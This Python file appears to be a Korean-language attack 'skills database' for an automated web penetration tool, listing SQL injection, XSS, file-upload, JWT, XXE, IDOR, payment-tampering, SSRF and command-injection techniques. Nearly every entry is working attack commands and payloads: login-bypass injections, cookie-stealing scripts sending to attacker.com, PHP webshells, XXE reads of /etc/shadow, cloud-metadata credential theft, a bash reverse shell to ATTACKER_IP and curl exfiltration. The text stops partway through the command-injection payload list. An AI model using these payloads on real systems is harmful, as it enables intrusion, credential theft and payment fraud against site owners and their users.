"""
skills_data16.py — 고급 웹 취약점 실전 스킬 DB
bingo v3.2.97

커버리지:
  [1] SQL Injection — 6가지 클로저 패턴 (숫자형/괄호/문자형/UA헤더/쿠키)
  [2] XSS — HTML context, JS context (var 내부), 파일 XSS, CSRF+XSS 체인
  [3] RCE — echo/blind/code injection, LFI, 고급
  [4] File Upload — 11가지 우회 (프론트엔드/블랙리스트/화이트리스트/MIME/파일헤더/WAF/레이스컨디션/디렉토리)
  [5] JWT — alg none / RS256→HS256 혼동 / jku key injection / 약한 시크릿
  [6] XXE — 기본 / 우회 / SOAP XML
  [7] IDOR — 수평/수직 권한상승, 미인증 접근, 파일 접근제어
  [8] 비즈니스 로직 — 이미지CAPTCHA, SMS코드, 비밀번호재설정, 세션, 사용자열거
  [9] 거래변조 — 금액변조, 리플레이, 3자결제, 레이스컨디션, 쿠폰남용
  [10] 종합 쇼핑몰 — 24개 취약점 엔드포인트 패턴 (로그인/IDOR/결제/파일업로드/SQLi/XSS/SSRF)
  [11] SSRF — 프로토콜 파싱, 내부망 접근, 클라우드 메타데이터
  [12] Path Traversal — 3단계 우회 패턴
  [13] 브루트포스 — 로그인 속도제한 부재, 계정 열거

총 스킬: 28개 신규 추가
"""

SKILLS_DB_16: dict[str, dict] = {

# ══════════════════════════════════════════════════════════════
# SQLi — 실제 취약 코드 패턴 역분석 (6가지 클로저)
# ══════════════════════════════════════════════════════════════

"16-001": {
    "name": "SQLi — 숫자형 무클로저 (GET id)",
    "module": "SQLInjection",
    "tags": ["sqli", "numeric", "get", "union", "blind"],
    "desc": """실제 취약 코드:
$id = $_GET['id'];
$sql = "SELECT * FROM articles WHERE id = $id AND status = 1";
클로저 없이 직접 삽입. UNION/Boolean/Time-based 모두 가능.""",
    "tools": ["sqlmap", "burpsuite", "curl"],
    "commands": [
        "# 기본 확인",
        "curl 'http://target/api/get-article.php?id=1'",
        "# Boolean blind",
        "curl 'http://target/api/get-article.php?id=1 AND 1=1'",
        "curl 'http://target/api/get-article.php?id=1 AND 1=2'",
        "# UNION 컬럼수 파악",
        "curl 'http://target/api/get-article.php?id=1 ORDER BY 6--'",
        "# UNION SELECT",
        "curl 'http://target/api/get-article.php?id=-1 UNION SELECT 1,2,user(),4,5,6--'",
        "# Time-based",
        "curl 'http://target/api/get-article.php?id=1 AND SLEEP(5)--'",
        "# sqlmap",
        "sqlmap -u 'http://target/api/get-article.php?id=1' --dbs --batch",
    ],
    "payloads": [
        "1 AND 1=1",
        "1 AND 1=2",
        "1 ORDER BY 10--",
        "-1 UNION SELECT 1,2,3,database(),5,6--",
        "1 AND SLEEP(5)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1;SELECT IF(1=1,SLEEP(5),0)--",
    ],
    "notes": "파라미터: GET id. 패턴: WHERE id = $id. 클로저 없음. sqlmap --level=3으로 자동 탐지 가능.",
},

"16-002": {
    "name": "SQLi — 문자형 단따옴표 클로저 (POST login)",
    "module": "SQLInjection",
    "tags": ["sqli", "string", "post", "auth-bypass", "login"],
    "desc": """실제 취약 코드:
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
클로저: 단따옴표(') — 로그인 우회 + 데이터 추출 가능.""",
    "tools": ["sqlmap", "burpsuite"],
    "commands": [
        "# 로그인 우회",
        "curl -X POST http://target/api/login.php -d \"username=admin'--&password=x\"",
        "curl -X POST http://target/api/login.php -d \"username=admin' OR '1'='1&password=x\"",
        "# 사용자 열거",
        "curl -X POST http://target/api/login.php -d \"username=admin'-- -&password=x\"",
        "# UNION으로 비밀번호 추출",
        "curl -X POST http://target/api/login.php -d \"username=' UNION SELECT 1,password,3,4 FROM users WHERE username='admin'--&password=x\"",
        "# Time-based (응답 차이 없을 때)",
        "curl -X POST http://target/api/login.php -d \"username=admin' AND SLEEP(5)--&password=x\"",
        "# sqlmap",
        "sqlmap -u 'http://target/api/login.php' --data='username=admin&password=test' -p username --dbs --batch",
    ],
    "payloads": [
        "admin'--",
        "admin' OR '1'='1'--",
        "' OR 1=1--",
        "' OR '1'='1",
        "admin'/*",
        "') OR ('1'='1",
        "' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--",
    ],
    "notes": "POST username 파라미터. WHERE username = '$username'. 로그인 우회 + 데이터 추출 동시 가능.",
},

"16-003": {
    "name": "SQLi — 숫자형 괄호 클로저 (POST category_id)",
    "module": "SQLInjection",
    "tags": ["sqli", "bracket", "numeric", "post"],
    "desc": """실제 취약 코드:
$check_sql = "SELECT * FROM categories WHERE id=($category_id)";
클로저: 괄호() — 닫는 괄호로 탈출 필요.""",
    "tools": ["sqlmap", "burpsuite"],
    "commands": [
        "# 괄호 탈출 확인",
        "curl -X POST http://target/api/submit-feedback.php -d 'category_id=1)'",
        "# Boolean",
        "curl -X POST http://target/api/submit-feedback.php -d 'category_id=1) AND (1=1'",
        "# UNION",
        "curl -X POST http://target/api/submit-feedback.php -d 'category_id=-1) UNION SELECT 1,2,3,4--'",
        "# Time-based",
        "curl -X POST http://target/api/submit-feedback.php -d 'category_id=1) AND (SLEEP(5)'",
        "sqlmap -u 'http://target/api/submit-feedback.php' --data='category_id=1' --dbs --batch --prefix=')' --suffix='--'",
    ],
    "payloads": [
        "1)",
        "1) AND (1=1",
        "1) OR (1=1",
        "-1) UNION SELECT 1,2,3--",
        "1) AND (SLEEP(5)",
        "1) AND (SELECT 1 FROM (SELECT SLEEP(5))A",
    ],
    "notes": "WHERE id=($category_id). 앞에 ) 삽입으로 클로저 탈출. sqlmap --prefix=')'",
},

"16-004": {
    "name": "SQLi — 문자형 쌍따옴표 클로저 (POST category)",
    "module": "SQLInjection",
    "tags": ["sqli", "double-quote", "post"],
    "desc": """실제 취약 코드:
$sql = "SELECT * FROM articles WHERE c.name = \"$category\" AND a.status = 1";
클로저: 쌍따옴표(\") — 쌍따옴표로 탈출.""",
    "tools": ["sqlmap", "burpsuite"],
    "commands": [
        '# 쌍따옴표 탈출',
        'curl -X POST http://target/api/search-articles.php -d \'category=tech"--\'',
        '# UNION',
        'curl -X POST http://target/api/search-articles.php -d \'category=" UNION SELECT 1,2,3,4,5--\'',
        '# Boolean',
        'curl -X POST http://target/api/search-articles.php -d \'category=tech" AND "1"="1\'',
        '# sqlmap',
        'sqlmap -u \'http://target/api/search-articles.php\' --data=\'category=tech\' -p category --dbs --batch',
    ],
    "payloads": [
        '"--',
        '" OR "1"="1',
        '" UNION SELECT 1,2,3--',
        '" AND SLEEP(5)--',
        '" AND "1"="1',
    ],
    "notes": "WHERE c.name = \"$category\". 쌍따옴표 탈출. 한국 PHP 앱에서 흔함.",
},

"16-005": {
    "name": "SQLi — Cookie / HTTP Header 인젝션",
    "module": "SQLInjection",
    "tags": ["sqli", "cookie", "header", "user-agent", "blind"],
    "desc": """실제 취약 코드:
$token = $_COOKIE['user_token'];
$sql = "SELECT * FROM preferences WHERE (pref_key) = ('$token')";
  
$ua = $_SERVER['HTTP_USER_AGENT'];
$sql = "SELECT * FROM visit_logs WHERE user_agent LIKE '%$ua%'";
쿠키와 User-Agent 헤더로 SQLi 가능.""",
    "tools": ["sqlmap", "burpsuite"],
    "commands": [
        "# Cookie 인젝션",
        "curl -b \"user_token=default') UNION SELECT 1,2,3,4-- \" http://target/api/get-preferences.php",
        "curl -b \"user_token=') OR ('1'='1\" http://target/api/get-preferences.php",
        "# User-Agent 인젝션",
        "curl -A \"Mozilla' AND SLEEP(5)-- \" http://target/api/log-visit.php",
        "curl -A \"Mozilla' UNION SELECT 1,2,3-- \" http://target/api/log-visit.php",
        "# sqlmap — Cookie",
        "sqlmap -u 'http://target/api/get-preferences.php' --cookie='user_token=default' -p user_token --level=3 --dbs --batch",
        "# sqlmap — User-Agent",
        "sqlmap -u 'http://target/api/log-visit.php' --user-agent='Mozilla' --level=3 --dbs --batch",
    ],
    "payloads": [
        "default') UNION SELECT 1,user(),3,4-- ",
        "') OR ('1'='1",
        "default') AND SLEEP(5)-- ",
        "Mozilla' AND SLEEP(5)-- ",
        "Mozilla' UNION SELECT 1,2,3-- ",
        "Mozilla%' UNION SELECT 1,2,3-- ",
    ],
    "notes": "Cookie와 User-Agent는 sqlmap --level=3 이상에서 자동 테스트. 단따옴표+괄호 복합 클로저 주의.",
},

"16-006": {
    "name": "SQLi — Time-Based Blind (키워드 필터 우회)",
    "module": "SQLInjection",
    "tags": ["sqli", "blind", "time-based", "waf-bypass", "keyword-filter"],
    "desc": """키워드 필터 우회 Time-based Blind SQLi.
SLEEP, UNION, SELECT 등 필터링 시 우회 기법.""",
    "tools": ["sqlmap", "burpsuite"],
    "commands": [
        "# 기본 time-based",
        "curl 'http://target/api/search.php?keyword=test' -d 'q=1 AND SLEEP(5)'",
        "# SLEEP 필터 우회",
        "curl 'http://target/...' -d 'id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)'",
        "# 대소문자 우회",
        "curl 'http://target/...' -d 'id=1 AnD SlEeP(5)--'",
        "# 이중 키워드 우회",
        "curl 'http://target/...' -d 'id=1 anandd slesleepep(5)--'",
        "# 인라인 주석 우회",
        "curl 'http://target/...' -d 'id=1 AND/**/SLEEP(5)--'",
        "# sqlmap 우회 옵션",
        "sqlmap -u 'http://target/...' --tamper=space2comment,between,randomcase --level=5 --risk=3 --dbs --batch",
    ],
    "payloads": [
        "1 AND SLEEP(5)--",
        "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AnD SlEeP(5)--",
        "1 AND/**/SLEEP(5)--",
        "1 AND 0x53 REGEXP 0x53 AND SLEEP(5)--",
        "';WAITFOR DELAY '0:0:5'--",  # MSSQL
        "1||(SELECT 0 FROM(SELECT(SLEEP(5)))a)||'",
    ],
    "notes": "sqlmap tamper: space2comment, between, randomcase. --level=5 --risk=3으로 공격 강도 증가.",
},

# ══════════════════════════════════════════════════════════════
# XSS — 실제 출력 컨텍스트 분석
# ══════════════════════════════════════════════════════════════

"16-007": {
    "name": "XSS — HTML 직접 출력 (echo $input 패턴)",
    "module": "XSS",
    "tags": ["xss", "reflected", "html-context", "stored"],
    "desc": """실제 취약 코드:
$searchResult = $_POST['search'];
...
<?php echo $searchResult; ?>
htmlspecialchars 미적용 — 직접 HTML 태그 삽입 가능.""",
    "tools": ["burpsuite", "dalfox", "xsstrike"],
    "commands": [
        "# 기본 확인",
        "curl -X POST http://target/search -d 'search=<script>alert(1)</script>'",
        "# CSP 없을 때",
        "curl -X POST http://target/search -d 'search=<img src=x onerror=alert(document.cookie)>'",
        "# 쿠키 탈취",
        "curl -X POST http://target/search -d 'search=<script>document.location=\"http://attacker.com/steal?c=\"+document.cookie</script>'",
        "# XSStrike 자동 탐지",
        "python3 xsstrike.py -u 'http://target/search' --data 'search=FUZZ'",
        "# dalfox",
        "dalfox url 'http://target/search' -p search --method POST",
    ],
    "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
        "<script>new Image().src='http://attacker.com/steal?c='+btoa(document.cookie)</script>",
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
    ],
    "notes": "echo $var; 패턴 탐지 → htmlspecialchars 미적용 확인. 저장형 XSS는 DB에 저장 후 다른 페이지에서 실행.",
},

"16-008": {
    "name": "XSS — JS Context 문자열 탈출 (var userInput = \"...\")",
    "module": "XSS",
    "tags": ["xss", "js-context", "dom", "string-escape"],
    "desc": """실제 취약 코드:
var userInput = "<?php echo str_replace('"', '\\\\"', $filteredCode); ?>";
document.getElementById('output').innerHTML = '입력: ' + userInput;

쌍따옴표만 이스케이프 — 단따옴표, 역슬래시로 탈출 가능.
innerHTML에 직접 삽입으로 DOM XSS.""",
    "tools": ["burpsuite", "dalfox"],
    "commands": [
        "# JS 컨텍스트 탈출 (쌍따옴표 필터 시 단따옴표 탈출)",
        "curl -X POST http://target/ -d \"xss_code=\\';alert(1)//\"",
        "# 역슬래시로 이스케이프 무력화",
        "curl -X POST http://target/ -d 'xss_code=\\\\';alert(1)//'",
        "# innerHTML 통한 DOM XSS",
        "curl -X POST http://target/ -d 'xss_code=</script><script>alert(1)</script>'",
        "# 템플릿 리터럴 탈출",
        "curl -X POST http://target/ -d 'xss_code=`-alert(1)-`'",
        "# 개행문자 삽입",
        "curl -X POST http://target/ -d $'xss_code=\\n;alert(1)//'",
    ],
    "payloads": [
        "\\';alert(1)//",
        "\";alert(1)//",
        "\\\\';alert(1)//",
        "</script><script>alert(1)</script>",
        "`-alert(1)-`",
        "'+alert(1)+'",
        "\u2028;alert(1)//",  # JS line separator
        "\\n;alert(1)//",
    ],
    "notes": "var x = \"USER_INPUT\" 패턴. 단따옴표 시도 → 역슬래시 시도 → 개행 시도. innerHTML 있으면 더 쉬움.",
},

"16-009": {
    "name": "XSS — 파일 XSS (SVG/HTML 파일 업로드)",
    "module": "XSS",
    "tags": ["xss", "file-upload", "svg", "html", "stored"],
    "desc": """파일 업로드 후 직접 서브된 SVG/HTML 파일에서 XSS 실행.
업로드 경로 직접 접근 가능할 때 유효.""",
    "tools": ["burpsuite", "curl"],
    "commands": [
        "# SVG XSS 파일 생성",
        "echo '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\"/>' > evil.svg",
        "# HTML XSS 파일",
        "echo '<html><script>alert(document.cookie)</script></html>' > evil.html",
        "# 업로드",
        "curl -X POST http://target/upload -F 'file=@evil.svg;type=image/svg+xml'",
        "# 업로드 경로 직접 접근",
        "curl http://target/uploads/evil.svg",
        "# PDF XSS (일부 브라우저)",
        "# <</Type /Catalog /OpenAction <</Type /Action /S /JavaScript /JS (app.alert(1))>>",
    ],
    "payloads": [
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        '<svg><script>alert(1)</script></svg>',
        '<html><body><script>alert(document.cookie)</script></body></html>',
        '<script>fetch("http://attacker.com?x="+document.cookie)</script>',
    ],
    "notes": "SVG는 image/svg+xml MIME. 업로드 후 /uploads/ 경로로 직접 접근. Content-Disposition: inline이면 실행됨.",
},

# ══════════════════════════════════════════════════════════════
# File Upload — 11가지 우회 패턴
# ══════════════════════════════════════════════════════════════

"16-010": {
    "name": "파일 업로드 — 우회 체계적 공략 (11가지)",
    "module": "FileUpload",
    "tags": ["file-upload", "rce", "bypass", "extension", "mime", "race"],
    "desc": """실전 11가지 업로드 우회:
1. 프론트엔드 검증 우회 (JS 비활성화/Burp intercept)
2. 확장자 블랙리스트 우회 (.php → .php5/.phtml/.pHp/.php.jpg)
3. 확장자 화이트리스트 우회 (이중 확장자 .jpg.php, NULL byte)
4. Content-Type 우회 (image/jpeg 변조)
5. 파일 헤더 우회 (GIF89a 추가)
6. WAF 우회 (청크 인코딩, 대용량 바디)
7. 레이스 컨디션 (업로드→검증 사이 접근)
8. 디렉토리 권한 우회 (../path traversal in filename)
9. JS 클라이언트 검증 우회
10. 다중 파일 업로드
11. 확장자 종합 우회""",
    "tools": ["burpsuite", "curl", "weevely", "antsword"],
    "commands": [
        "# 웹셸 생성",
        "echo '<?php system($_GET[\"cmd\"]);?>' > shell.php",
        "# 1. Content-Type 우회",
        "curl -X POST http://target/upload -F 'file=@shell.php;type=image/jpeg'",
        "# 2. 이중 확장자",
        "cp shell.php shell.php.jpg && curl -X POST http://target/upload -F 'file=@shell.php.jpg'",
        "# 3. 확장자 변종",
        "cp shell.php shell.phtml && curl -X POST http://target/upload -F 'file=@shell.phtml'",
        "cp shell.php shell.php5 && curl -X POST http://target/upload -F 'file=@shell.php5'",
        "# 4. 파일 헤더 추가",
        "printf 'GIF89a<?php system($_GET[\"cmd\"]);?>' > shell.gif.php",
        "curl -X POST http://target/upload -F 'file=@shell.gif.php;type=image/gif'",
        "# 5. NULL byte (PHP 5.x)",
        "curl -X POST http://target/upload -F 'file=@shell.php%00.jpg'",
        "# 6. 레이스 컨디션",
        "for i in {1..100}; do curl -s http://target/uploads/shell.php?cmd=id & done",
        "# 업로드 후 웹셸 실행",
        "curl 'http://target/uploads/shell.php?cmd=id'",
        "curl 'http://target/uploads/shell.php?cmd=cat /etc/passwd'",
    ],
    "payloads": [
        "<?php system($_GET['cmd']);?>",
        "<?php passthru($_GET['cmd']);?>",
        "<?php eval($_POST['c']);?>",
        "GIF89a<?php system($_GET['cmd']);?>",
        "<?php $c=base64_decode($_GET['c']);eval($c);?>",
        "<?php @eval($_REQUEST['pass']);?>",
        "<?=`{$_GET['cmd']}`?>",
    ],
    "notes": "업로드 경로 파악이 핵심. /uploads/, /images/, /files/ 등. .htaccess 업로드로 PHP 실행 활성화 가능.",
},

# ══════════════════════════════════════════════════════════════
# JWT — 알고리즘 혼동 + Key Injection
# ══════════════════════════════════════════════════════════════

"16-011": {
    "name": "JWT — alg:none 공격 + HS256/RS256 알고리즘 혼동",
    "module": "JWT",
    "tags": ["jwt", "none-alg", "algorithm-confusion", "rs256", "hs256"],
    "desc": """JWT 취약점 3종:
1. alg:none — 서명 없이 토큰 위조
2. HS256→RS256 혼동 — 공개키로 HMAC 서명
3. jku/x5u Key Injection — 공격자 제어 키 서버 지정

실제 취약 코드:
$parts = explode('.', $token);
// alg 검증 없이 payload 파싱""",
    "tools": ["jwt_tool", "burpsuite", "python3"],
    "commands": [
        "# alg:none 공격",
        "python3 -c \"",
        "import base64, json",
        "header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()",
        "payload = base64.urlsafe_b64encode(json.dumps({'username':'admin','role':'admin'}).encode()).rstrip(b'=').decode()",
        "print(f'{header}.{payload}.')\"",
        "",
        "# jwt_tool — none 공격",
        "python3 jwt_tool.py <TOKEN> -X a",
        "",
        "# RS256→HS256 혼동 (공개키로 HMAC)",
        "python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem",
        "",
        "# jku Key Injection",
        "python3 jwt_tool.py <TOKEN> -X i -ju 'http://attacker.com/jwks.json'",
        "",
        "# 약한 시크릿 크래킹",
        "hashcat -a 0 -m 16500 <TOKEN> /usr/share/wordlists/rockyou.txt",
        "python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt",
    ],
    "payloads": [
        '{"alg":"none","typ":"JWT"}',
        '{"alg":"None","typ":"JWT"}',
        '{"alg":"NONE","typ":"JWT"}',
        '{"alg":"HS256","typ":"JWT"} + RS256 공개키로 서명',
        '{"alg":"RS256","jku":"http://attacker.com/jwks.json","typ":"JWT"}',
    ],
    "notes": "jwt_tool: -X a (none), -X k (key confusion), -X i (jku inject), -C (crack). test/test123/secret 먼저 시도.",
},

# ══════════════════════════════════════════════════════════════
# XXE — 파일 업로드형 XML
# ══════════════════════════════════════════════════════════════

"16-012": {
    "name": "XXE — XML 파일 업로드 / POST body",
    "module": "XXE",
    "tags": ["xxe", "file-read", "ssrf", "blind-xxe"],
    "desc": """XML 파일 업로드 또는 XML body로 XXE.
XML 파일 업로드 → 서버측 파싱 → 파일 읽기.""",
    "tools": ["burpsuite", "xxeinjector"],
    "commands": [
        "# 기본 파일 읽기",
        "curl -X POST http://target/upload-xml -F 'file=@evil.xml;type=text/xml'",
        "# POST body XXE",
        "curl -X POST http://target/parse -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
        "# Blind XXE (OOB)",
        "# 공격자 서버에서: nc -lvp 80",
        "curl -X POST http://target/parse -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><root/>'",
        "# Windows 경로",
        "# file:///C:/Windows/System32/drivers/etc/hosts",
    ],
    "payloads": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">]><root>&xxe;</root>',
    ],
    "notes": "PHP: libxml_disable_entity_loader(true) 없으면 취약. Blind XXE: out-of-band로 exfil. php://filter로 소스 탈취.",
},

# ══════════════════════════════════════════════════════════════
# IDOR / 접근 제어
# ══════════════════════════════════════════════════════════════

"16-013": {
    "name": "IDOR — 수평/수직 권한상승 + 미인증 접근",
    "module": "IDOR",
    "tags": ["idor", "access-control", "horizontal", "vertical", "unauth"],
    "desc": """실전 취약점:
- 수평: 다른 사용자 주문 조회 (/api/user/order-detail.php?order_no=X)
- 수직: 일반 사용자가 관리자 API 접근 (/api/admin/user-list.php)
- 미인증: 로그인 없이 관리자 패널 접근
- 파일: 다른 사용자 파일 다운로드/삭제""",
    "tools": ["burpsuite", "ffuf", "wfuzz"],
    "commands": [
        "# 수평 IDOR — 주문 ID 변조",
        "curl -b 'session=USER_SESSION' 'http://target/api/user/order-detail.php?order_no=1001'",
        "curl -b 'session=USER_SESSION' 'http://target/api/user/order-detail.php?order_no=1002'",
        "# 수직 IDOR — 일반 세션으로 관리자 API",
        "curl -b 'session=USER_SESSION' 'http://target/api/admin/user-list.php'",
        "# 미인증 접근",
        "curl 'http://target/admin/' --max-redirs 0",
        "curl 'http://target/merchant/index'",
        "# user_hash 기반 IDOR",
        "curl 'http://target/api/user/balance-records.php?user_hash=abc123'",
        "# ID 순회",
        "for i in {1..100}; do curl -s -b 'session=USER_SESSION' \"http://target/api/user/order-detail.php?order_no=$i\" | grep -v 'error'; done",
        "# ffuf로 ID 퍼징",
        "ffuf -u 'http://target/api/user/order-detail.php?order_no=FUZZ' -w <(seq 1 1000) -b 'session=USER_SESSION'",
    ],
    "payloads": [],
    "notes": "order_no, user_hash, product_no 등 식별자 변조. JWT 페이로드 내 user_id 변조도 확인. 권한 검사 없는 API가 핵심.",
},

# ══════════════════════════════════════════════════════════════
# 비즈니스 로직
# ══════════════════════════════════════════════════════════════

"16-014": {
    "name": "비즈니스 로직 — 인증 우회 (CAPTCHA/SMS/비밀번호재설정)",
    "module": "BusinessLogic",
    "tags": ["business-logic", "captcha-bypass", "sms-bypass", "password-reset"],
    "desc": """인증 우회 패턴:
1. 이미지 CAPTCHA — 응답에서 답 노출 / 재사용 / 빈값
2. SMS 코드 — 고정값(000000) / 서버 응답에 코드 포함 / 브루트포스
3. 비밀번호 재설정 — 토큰 재사용 / 예측 가능 토큰 / 다른 사용자 토큰
4. 세션 고정 — 로그인 전후 세션 ID 동일""",
    "tools": ["burpsuite", "ffuf", "python3"],
    "commands": [
        "# CAPTCHA — 응답 분석 (코드가 응답에 포함될 수 있음)",
        "curl http://target/api/captcha",
        "# CAPTCHA 재사용 (같은 토큰으로 반복)",
        "curl -X POST http://target/register -d 'captcha=1234&captcha_token=TOKEN'",
        "# SMS 브루트포스",
        "ffuf -X POST -u 'http://target/verify' -d 'phone=13800138000&code=FUZZ' -w <(seq -w 0 999999) -fs 0",
        "# 비밀번호 재설정 토큰 재사용",
        "curl -X POST http://target/api/user/reset-password.php -d 'auth_token=CAPTURED_TOKEN&password=newpass'",
        "# 토큰 예측 (타임스탬프 기반)",
        "python3 -c \"import time; print(int(time.time()))\"",
        "# 다른 사용자 이메일로 재설정, 자신의 받은 토큰 사용",
        "curl -X POST http://target/reset -d 'email=victim@example.com'",
        "curl -X POST http://target/reset-confirm -d 'token=MY_VALID_TOKEN&email=victim@example.com'",
    ],
    "payloads": [
        "captcha=''",
        "captcha=000000",
        "captcha=999999",
        "sms_code=000000",
        "sms_code=123456",
        "auth_token=''",
        "auth_token=0",
    ],
    "notes": "응답 헤더/바디에서 토큰 탐색. X-Captcha-Answer 같은 커스텀 헤더. SMS 6자리 = 1M개 → ffuf 빠름.",
},

"16-015": {
    "name": "비즈니스 로직 — 거래 변조 (금액/쿠폰/리플레이/레이스)",
    "module": "BusinessLogic",
    "tags": ["business-logic", "price-tampering", "race-condition", "replay", "discount"],
    "desc": """거래 변조 패턴:
1. 금액 변조 — order 생성 시 price 직접 조작
2. 리플레이 공격 — 동일 결제 콜백 반복 전송
3. 레이스 컨디션 — 충전/환불 동시 다중 요청
4. 쿠폰 남용 — 쿠폰 중복 사용 / use_points 조작
5. 이상 데이터 — 음수/소수/최대값 입력""",
    "tools": ["burpsuite", "turbo-intruder", "python3"],
    "commands": [
        "# 금액 변조",
        "curl -X POST http://target/api/user/create-order.php -b 'session=X' -d 'product_id=1&price=0.01&quantity=1'",
        "curl -X POST http://target/api/user/create-order.php -b 'session=X' -d 'product_id=1&price=-100'",
        "# 쿠폰/포인트 조작",
        "curl -X POST http://target/api/user/create-batch-order.php -d 'use_points=999999&product_id=1'",
        "# 리플레이 공격",
        "for i in {1..10}; do curl -X POST http://target/api/user/recharge-callback.php -d 'recharge_no=PAY123&amount=100' & done",
        "# 레이스 컨디션 (bash+xargs)",
        "printf '%s\\n' $(seq 20) | xargs -P20 -I{} curl -sk -m 10 -X POST 'http://target/api/user/refund.php' "
        "-d 'refund_amount=100' -H 'Cookie: session=X' -o /tmp/race_{}.txt -w '%{http_code}\\n' | sort | uniq -c",
        "# 환불 금액 변조",
        "curl -X POST http://target/api/user/refund.php -d 'refund_amount=9999999'",
    ],
    "payloads": [
        "price=0.01",
        "price=-100",
        "amount=0.001",
        "use_points=99999999",
        "refund_amount=99999999",
        "probabilities=[1,0,0,0,0]",  # 확률 조작
    ],
    "notes": "Turbo Intruder의 single-packet attack으로 레이스 컨디션 최대화. HTTP/2 병렬 요청 활용.",
},

# ══════════════════════════════════════════════════════════════
# SSRF
# ══════════════════════════════════════════════════════════════

"16-016": {
    "name": "SSRF — URL fetch 취약점 (내부망/클라우드 메타데이터)",
    "module": "SSRF",
    "tags": ["ssrf", "internal", "cloud-metadata", "protocol"],
    "desc": """실제 취약 코드 패턴:
$url = $input['url'];
$parsed = parse_url($url);
// 미검증 URL로 curl/file_get_contents 실행

내부망 접근, 클라우드 메타데이터 탈취.""",
    "tools": ["burpsuite", "ssrfmap", "curl"],
    "commands": [
        "# 내부 서비스 접근",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://127.0.0.1:22\"}'",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://127.0.0.1:3306\"}'",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://192.168.1.1/admin\"}'",
        "# AWS 메타데이터",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'",
        "# GCP 메타데이터",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\"}'",
        "# 파일 읽기",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"file:///etc/passwd\"}'",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"dict://127.0.0.1:6379/info\"}'",
        "# 필터 우회",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://[::1]/\"}'",
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://0177.0.0.1/\"}'",  # 8진수
        "curl -X POST http://target/api/fetch -d '{\"url\":\"http://2130706433/\"}'",  # 10진수
    ],
    "payloads": [
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
        "http://[::]:80/",
        "http://0177.0.0.1/",
        "http://2130706433/",
    ],
    "notes": "parse_url로 필터링 시 우회: IP 진법 변환, IPv6, DNS rebinding. product-image-preview 같은 이미지 미리보기가 흔한 진입점.",
},

# ══════════════════════════════════════════════════════════════
# RCE
# ══════════════════════════════════════════════════════════════

"16-017": {
    "name": "RCE — PHP 명령 인젝션 (ping/curl/system)",
    "module": "RCE",
    "tags": ["rce", "command-injection", "ping", "blind", "oob"],
    "desc": """실제 취약 코드 패턴:
$host = $_GET['host'];
shell_exec("ping -c 4 $host");

// 또는
eval($_POST['code']);
exec($input);""",
    "tools": ["burpsuite", "commix", "curl"],
    "commands": [
        "# 기본 명령 인젝션",
        "curl 'http://target/api/ping.php?host=127.0.0.1;id'",
        "curl 'http://target/api/ping.php?host=127.0.0.1|id'",
        "curl 'http://target/api/ping.php?host=127.0.0.1&&id'",
        "curl 'http://target/api/ping.php?host=127.0.0.1`id`'",
        "curl 'http://target/api/ping.php?host=$(id)'",
        "# 역셸",
        "curl 'http://target/api/ping.php?host=127.0.0.1;bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'",
        "# Blind RCE (시간 기반)",
        "curl 'http://target/api/ping.php?host=127.0.0.1;sleep+5'",
        "# OOB (외부로 데이터 전송)",
        "curl 'http://target/api/ping.php?host=127.0.0.1;curl+ATTACKER.com/$(id|base64)'",
        "# commix 자동화",
        "commix --url='http://target/api/ping.php?host=127.0.0.1' -p host --os-shell",
    ],
    "payloads": [
        "127.0.0.1;id",
        "127.0.0.1|id",
        "127.0.0.1&&id",
        "127.0.0.1`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
